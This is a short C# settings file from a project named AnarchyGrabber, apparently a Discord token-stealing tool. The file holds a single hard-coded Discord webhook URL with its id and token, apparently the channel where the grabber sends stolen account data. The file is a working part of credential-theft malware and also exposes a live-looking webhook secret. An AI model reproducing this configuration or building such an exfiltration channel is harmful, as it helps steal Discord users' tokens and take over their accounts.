﻿namespace AnarchyGrabber
{
    class Settings
    {
        public static string Webhook = "https://discordapp.com/api/webhooks/702870933756444753/nYyJjTvhkDlbI7OqhXASo-mO_5fip8Pe39KdPt7yNzCO3IEHNmALTHn7aEdePQ3Zu5a7";
    }
}
